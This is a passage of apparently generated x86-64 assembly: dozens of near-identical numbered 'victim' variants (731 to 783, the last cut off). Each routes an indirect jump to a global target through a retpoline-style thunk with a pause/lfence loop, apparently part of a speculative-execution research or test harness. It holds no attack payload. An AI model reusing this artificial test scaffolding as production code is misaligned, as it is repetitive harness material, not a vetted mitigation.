	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000731
	jmp	.Lgg_retpol_after_000731
.Lgg_retpol_thunk_000731:
	callq	.Lgg_retpol_setup_000731
.Lgg_retpol_cap_000731:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000731
.Lgg_retpol_setup_000731:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000731:
	jmp	.Lvictim_win0_continue
## Variant 732
.Lvictim_win0_var732:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000732
	jmp	.Lgg_retpol_after_000732
.Lgg_retpol_thunk_000732:
	callq	.Lgg_retpol_setup_000732
.Lgg_retpol_cap_000732:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000732
.Lgg_retpol_setup_000732:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000732:
	jmp	.Lvictim_win0_continue
## Variant 733
.Lvictim_win0_var733:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000733
	jmp	.Lgg_retpol_after_000733
.Lgg_retpol_thunk_000733:
	callq	.Lgg_retpol_setup_000733
.Lgg_retpol_cap_000733:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000733
.Lgg_retpol_setup_000733:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000733:
	jmp	.Lvictim_win0_continue
## Variant 734
.Lvictim_win0_var734:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000734
	jmp	.Lgg_retpol_after_000734
.Lgg_retpol_thunk_000734:
	callq	.Lgg_retpol_setup_000734
.Lgg_retpol_cap_000734:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000734
.Lgg_retpol_setup_000734:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000734:
	jmp	.Lvictim_win0_continue
## Variant 735
.Lvictim_win0_var735:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000735
	jmp	.Lgg_retpol_after_000735
.Lgg_retpol_thunk_000735:
	callq	.Lgg_retpol_setup_000735
.Lgg_retpol_cap_000735:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000735
.Lgg_retpol_setup_000735:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000735:
	jmp	.Lvictim_win0_continue
## Variant 736
.Lvictim_win0_var736:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000736
	jmp	.Lgg_retpol_after_000736
.Lgg_retpol_thunk_000736:
	callq	.Lgg_retpol_setup_000736
.Lgg_retpol_cap_000736:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000736
.Lgg_retpol_setup_000736:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000736:
	jmp	.Lvictim_win0_continue
## Variant 737
.Lvictim_win0_var737:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000737
	jmp	.Lgg_retpol_after_000737
.Lgg_retpol_thunk_000737:
	callq	.Lgg_retpol_setup_000737
.Lgg_retpol_cap_000737:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000737
.Lgg_retpol_setup_000737:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000737:
	jmp	.Lvictim_win0_continue
## Variant 738
.Lvictim_win0_var738:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000738
	jmp	.Lgg_retpol_after_000738
.Lgg_retpol_thunk_000738:
	callq	.Lgg_retpol_setup_000738
.Lgg_retpol_cap_000738:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000738
.Lgg_retpol_setup_000738:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000738:
	jmp	.Lvictim_win0_continue
## Variant 739
.Lvictim_win0_var739:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000739
	jmp	.Lgg_retpol_after_000739
.Lgg_retpol_thunk_000739:
	callq	.Lgg_retpol_setup_000739
.Lgg_retpol_cap_000739:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000739
.Lgg_retpol_setup_000739:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000739:
	jmp	.Lvictim_win0_continue
## Variant 740
.Lvictim_win0_var740:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000740
	jmp	.Lgg_retpol_after_000740
.Lgg_retpol_thunk_000740:
	callq	.Lgg_retpol_setup_000740
.Lgg_retpol_cap_000740:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000740
.Lgg_retpol_setup_000740:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000740:
	jmp	.Lvictim_win0_continue
## Variant 741
.Lvictim_win0_var741:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000741
	jmp	.Lgg_retpol_after_000741
.Lgg_retpol_thunk_000741:
	callq	.Lgg_retpol_setup_000741
.Lgg_retpol_cap_000741:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000741
.Lgg_retpol_setup_000741:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000741:
	jmp	.Lvictim_win0_continue
## Variant 742
.Lvictim_win0_var742:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000742
	jmp	.Lgg_retpol_after_000742
.Lgg_retpol_thunk_000742:
	callq	.Lgg_retpol_setup_000742
.Lgg_retpol_cap_000742:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000742
.Lgg_retpol_setup_000742:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000742:
	jmp	.Lvictim_win0_continue
## Variant 743
.Lvictim_win0_var743:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000743
	jmp	.Lgg_retpol_after_000743
.Lgg_retpol_thunk_000743:
	callq	.Lgg_retpol_setup_000743
.Lgg_retpol_cap_000743:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000743
.Lgg_retpol_setup_000743:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000743:
	jmp	.Lvictim_win0_continue
## Variant 744
.Lvictim_win0_var744:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000744
	jmp	.Lgg_retpol_after_000744
.Lgg_retpol_thunk_000744:
	callq	.Lgg_retpol_setup_000744
.Lgg_retpol_cap_000744:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000744
.Lgg_retpol_setup_000744:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000744:
	jmp	.Lvictim_win0_continue
## Variant 745
.Lvictim_win0_var745:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000745
	jmp	.Lgg_retpol_after_000745
.Lgg_retpol_thunk_000745:
	callq	.Lgg_retpol_setup_000745
.Lgg_retpol_cap_000745:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000745
.Lgg_retpol_setup_000745:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000745:
	jmp	.Lvictim_win0_continue
## Variant 746
.Lvictim_win0_var746:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000746
	jmp	.Lgg_retpol_after_000746
.Lgg_retpol_thunk_000746:
	callq	.Lgg_retpol_setup_000746
.Lgg_retpol_cap_000746:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000746
.Lgg_retpol_setup_000746:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000746:
	jmp	.Lvictim_win0_continue
## Variant 747
.Lvictim_win0_var747:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000747
	jmp	.Lgg_retpol_after_000747
.Lgg_retpol_thunk_000747:
	callq	.Lgg_retpol_setup_000747
.Lgg_retpol_cap_000747:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000747
.Lgg_retpol_setup_000747:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000747:
	jmp	.Lvictim_win0_continue
## Variant 748
.Lvictim_win0_var748:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000748
	jmp	.Lgg_retpol_after_000748
.Lgg_retpol_thunk_000748:
	callq	.Lgg_retpol_setup_000748
.Lgg_retpol_cap_000748:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000748
.Lgg_retpol_setup_000748:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000748:
	jmp	.Lvictim_win0_continue
## Variant 749
.Lvictim_win0_var749:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000749
	jmp	.Lgg_retpol_after_000749
.Lgg_retpol_thunk_000749:
	callq	.Lgg_retpol_setup_000749
.Lgg_retpol_cap_000749:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000749
.Lgg_retpol_setup_000749:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000749:
	jmp	.Lvictim_win0_continue
## Variant 750
.Lvictim_win0_var750:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000750
	jmp	.Lgg_retpol_after_000750
.Lgg_retpol_thunk_000750:
	callq	.Lgg_retpol_setup_000750
.Lgg_retpol_cap_000750:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000750
.Lgg_retpol_setup_000750:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000750:
	jmp	.Lvictim_win0_continue
## Variant 751
.Lvictim_win0_var751:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000751
	jmp	.Lgg_retpol_after_000751
.Lgg_retpol_thunk_000751:
	callq	.Lgg_retpol_setup_000751
.Lgg_retpol_cap_000751:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000751
.Lgg_retpol_setup_000751:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000751:
	jmp	.Lvictim_win0_continue
## Variant 752
.Lvictim_win0_var752:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000752
	jmp	.Lgg_retpol_after_000752
.Lgg_retpol_thunk_000752:
	callq	.Lgg_retpol_setup_000752
.Lgg_retpol_cap_000752:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000752
.Lgg_retpol_setup_000752:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000752:
	jmp	.Lvictim_win0_continue
## Variant 753
.Lvictim_win0_var753:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000753
	jmp	.Lgg_retpol_after_000753
.Lgg_retpol_thunk_000753:
	callq	.Lgg_retpol_setup_000753
.Lgg_retpol_cap_000753:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000753
.Lgg_retpol_setup_000753:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000753:
	jmp	.Lvictim_win0_continue
## Variant 754
.Lvictim_win0_var754:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000754
	jmp	.Lgg_retpol_after_000754
.Lgg_retpol_thunk_000754:
	callq	.Lgg_retpol_setup_000754
.Lgg_retpol_cap_000754:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000754
.Lgg_retpol_setup_000754:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000754:
	jmp	.Lvictim_win0_continue
## Variant 755
.Lvictim_win0_var755:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000755
	jmp	.Lgg_retpol_after_000755
.Lgg_retpol_thunk_000755:
	callq	.Lgg_retpol_setup_000755
.Lgg_retpol_cap_000755:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000755
.Lgg_retpol_setup_000755:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000755:
	jmp	.Lvictim_win0_continue
## Variant 756
.Lvictim_win0_var756:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000756
	jmp	.Lgg_retpol_after_000756
.Lgg_retpol_thunk_000756:
	callq	.Lgg_retpol_setup_000756
.Lgg_retpol_cap_000756:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000756
.Lgg_retpol_setup_000756:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000756:
	jmp	.Lvictim_win0_continue
## Variant 757
.Lvictim_win0_var757:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000757
	jmp	.Lgg_retpol_after_000757
.Lgg_retpol_thunk_000757:
	callq	.Lgg_retpol_setup_000757
.Lgg_retpol_cap_000757:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000757
.Lgg_retpol_setup_000757:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000757:
	jmp	.Lvictim_win0_continue
## Variant 758
.Lvictim_win0_var758:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000758
	jmp	.Lgg_retpol_after_000758
.Lgg_retpol_thunk_000758:
	callq	.Lgg_retpol_setup_000758
.Lgg_retpol_cap_000758:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000758
.Lgg_retpol_setup_000758:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000758:
	jmp	.Lvictim_win0_continue
## Variant 759
.Lvictim_win0_var759:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000759
	jmp	.Lgg_retpol_after_000759
.Lgg_retpol_thunk_000759:
	callq	.Lgg_retpol_setup_000759
.Lgg_retpol_cap_000759:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000759
.Lgg_retpol_setup_000759:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000759:
	jmp	.Lvictim_win0_continue
## Variant 760
.Lvictim_win0_var760:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000760
	jmp	.Lgg_retpol_after_000760
.Lgg_retpol_thunk_000760:
	callq	.Lgg_retpol_setup_000760
.Lgg_retpol_cap_000760:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000760
.Lgg_retpol_setup_000760:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000760:
	jmp	.Lvictim_win0_continue
## Variant 761
.Lvictim_win0_var761:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000761
	jmp	.Lgg_retpol_after_000761
.Lgg_retpol_thunk_000761:
	callq	.Lgg_retpol_setup_000761
.Lgg_retpol_cap_000761:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000761
.Lgg_retpol_setup_000761:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000761:
	jmp	.Lvictim_win0_continue
## Variant 762
.Lvictim_win0_var762:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000762
	jmp	.Lgg_retpol_after_000762
.Lgg_retpol_thunk_000762:
	callq	.Lgg_retpol_setup_000762
.Lgg_retpol_cap_000762:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000762
.Lgg_retpol_setup_000762:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000762:
	jmp	.Lvictim_win0_continue
## Variant 763
.Lvictim_win0_var763:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000763
	jmp	.Lgg_retpol_after_000763
.Lgg_retpol_thunk_000763:
	callq	.Lgg_retpol_setup_000763
.Lgg_retpol_cap_000763:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000763
.Lgg_retpol_setup_000763:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000763:
	jmp	.Lvictim_win0_continue
## Variant 764
.Lvictim_win0_var764:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000764
	jmp	.Lgg_retpol_after_000764
.Lgg_retpol_thunk_000764:
	callq	.Lgg_retpol_setup_000764
.Lgg_retpol_cap_000764:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000764
.Lgg_retpol_setup_000764:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000764:
	jmp	.Lvictim_win0_continue
## Variant 765
.Lvictim_win0_var765:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000765
	jmp	.Lgg_retpol_after_000765
.Lgg_retpol_thunk_000765:
	callq	.Lgg_retpol_setup_000765
.Lgg_retpol_cap_000765:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000765
.Lgg_retpol_setup_000765:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000765:
	jmp	.Lvictim_win0_continue
## Variant 766
.Lvictim_win0_var766:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000766
	jmp	.Lgg_retpol_after_000766
.Lgg_retpol_thunk_000766:
	callq	.Lgg_retpol_setup_000766
.Lgg_retpol_cap_000766:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000766
.Lgg_retpol_setup_000766:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000766:
	jmp	.Lvictim_win0_continue
## Variant 767
.Lvictim_win0_var767:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000767
	jmp	.Lgg_retpol_after_000767
.Lgg_retpol_thunk_000767:
	callq	.Lgg_retpol_setup_000767
.Lgg_retpol_cap_000767:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000767
.Lgg_retpol_setup_000767:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000767:
	jmp	.Lvictim_win0_continue
## Variant 768
.Lvictim_win0_var768:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000768
	jmp	.Lgg_retpol_after_000768
.Lgg_retpol_thunk_000768:
	callq	.Lgg_retpol_setup_000768
.Lgg_retpol_cap_000768:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000768
.Lgg_retpol_setup_000768:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000768:
	jmp	.Lvictim_win0_continue
## Variant 769
.Lvictim_win0_var769:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000769
	jmp	.Lgg_retpol_after_000769
.Lgg_retpol_thunk_000769:
	callq	.Lgg_retpol_setup_000769
.Lgg_retpol_cap_000769:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000769
.Lgg_retpol_setup_000769:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000769:
	jmp	.Lvictim_win0_continue
## Variant 770
.Lvictim_win0_var770:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000770
	jmp	.Lgg_retpol_after_000770
.Lgg_retpol_thunk_000770:
	callq	.Lgg_retpol_setup_000770
.Lgg_retpol_cap_000770:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000770
.Lgg_retpol_setup_000770:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000770:
	jmp	.Lvictim_win0_continue
## Variant 771
.Lvictim_win0_var771:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000771
	jmp	.Lgg_retpol_after_000771
.Lgg_retpol_thunk_000771:
	callq	.Lgg_retpol_setup_000771
.Lgg_retpol_cap_000771:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000771
.Lgg_retpol_setup_000771:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000771:
	jmp	.Lvictim_win0_continue
## Variant 772
.Lvictim_win0_var772:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000772
	jmp	.Lgg_retpol_after_000772
.Lgg_retpol_thunk_000772:
	callq	.Lgg_retpol_setup_000772
.Lgg_retpol_cap_000772:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000772
.Lgg_retpol_setup_000772:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000772:
	jmp	.Lvictim_win0_continue
## Variant 773
.Lvictim_win0_var773:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000773
	jmp	.Lgg_retpol_after_000773
.Lgg_retpol_thunk_000773:
	callq	.Lgg_retpol_setup_000773
.Lgg_retpol_cap_000773:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000773
.Lgg_retpol_setup_000773:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000773:
	jmp	.Lvictim_win0_continue
## Variant 774
.Lvictim_win0_var774:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000774
	jmp	.Lgg_retpol_after_000774
.Lgg_retpol_thunk_000774:
	callq	.Lgg_retpol_setup_000774
.Lgg_retpol_cap_000774:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000774
.Lgg_retpol_setup_000774:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000774:
	jmp	.Lvictim_win0_continue
## Variant 775
.Lvictim_win0_var775:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000775
	jmp	.Lgg_retpol_after_000775
.Lgg_retpol_thunk_000775:
	callq	.Lgg_retpol_setup_000775
.Lgg_retpol_cap_000775:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000775
.Lgg_retpol_setup_000775:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000775:
	jmp	.Lvictim_win0_continue
## Variant 776
.Lvictim_win0_var776:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000776
	jmp	.Lgg_retpol_after_000776
.Lgg_retpol_thunk_000776:
	callq	.Lgg_retpol_setup_000776
.Lgg_retpol_cap_000776:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000776
.Lgg_retpol_setup_000776:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000776:
	jmp	.Lvictim_win0_continue
## Variant 777
.Lvictim_win0_var777:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000777
	jmp	.Lgg_retpol_after_000777
.Lgg_retpol_thunk_000777:
	callq	.Lgg_retpol_setup_000777
.Lgg_retpol_cap_000777:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000777
.Lgg_retpol_setup_000777:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000777:
	jmp	.Lvictim_win0_continue
## Variant 778
.Lvictim_win0_var778:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000778
	jmp	.Lgg_retpol_after_000778
.Lgg_retpol_thunk_000778:
	callq	.Lgg_retpol_setup_000778
.Lgg_retpol_cap_000778:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000778
.Lgg_retpol_setup_000778:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000778:
	jmp	.Lvictim_win0_continue
## Variant 779
.Lvictim_win0_var779:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000779
	jmp	.Lgg_retpol_after_000779
.Lgg_retpol_thunk_000779:
	callq	.Lgg_retpol_setup_000779
.Lgg_retpol_cap_000779:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000779
.Lgg_retpol_setup_000779:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000779:
	jmp	.Lvictim_win0_continue
## Variant 780
.Lvictim_win0_var780:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000780
	jmp	.Lgg_retpol_after_000780
.Lgg_retpol_thunk_000780:
	callq	.Lgg_retpol_setup_000780
.Lgg_retpol_cap_000780:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000780
.Lgg_retpol_setup_000780:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000780:
	jmp	.Lvictim_win0_continue
## Variant 781
.Lvictim_win0_var781:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000781
	jmp	.Lgg_retpol_after_000781
.Lgg_retpol_thunk_000781:
	callq	.Lgg_retpol_setup_000781
.Lgg_retpol_cap_000781:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000781
.Lgg_retpol_setup_000781:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000781:
	jmp	.Lvictim_win0_continue
## Variant 782
.Lvictim_win0_var782:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000782
	jmp	.Lgg_retpol_after_000782
.Lgg_retpol_thunk_000782:
	callq	.Lgg_retpol_setup_000782
.Lgg_retpol_cap_000782:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000782
.Lgg_retpol_setup_000782:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000782:
	jmp	.Lvictim_win0_continue
## Variant 783
.Lvictim_win0_var783:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
